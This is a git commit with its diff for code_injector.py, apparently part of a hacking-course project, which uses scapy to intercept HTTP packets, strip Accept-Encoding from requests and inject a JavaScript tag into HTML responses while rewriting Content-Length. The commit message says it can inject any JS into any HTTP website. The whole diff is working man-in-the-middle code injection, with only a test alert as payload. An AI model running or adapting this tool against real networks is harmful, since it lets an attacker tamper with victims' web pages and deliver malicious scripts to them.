0c9bbf84a25ffd77d7638ddb1de07fcbc11b1262
Nedheesh Hasija <nedheesh.hasija@gmail.com>
2019-01-16 12:02:37 +0530

    Added code and made changes to code_injector.py
    Now the code_injector can be used to inject any js code to on any http website regardless of them adding the content-length limiter

--- code_injector.py
+++ code_injector.py
@@ -16,16 +16,24 @@ def process_packet(packet):
 
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("This is a request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("This is a response")
-            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
-            new_packet = set_load(scapy_packet, modified_load)
+            # print(scapy_packet.show())
+            injection_code = "<script>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
     packet.accept()
 
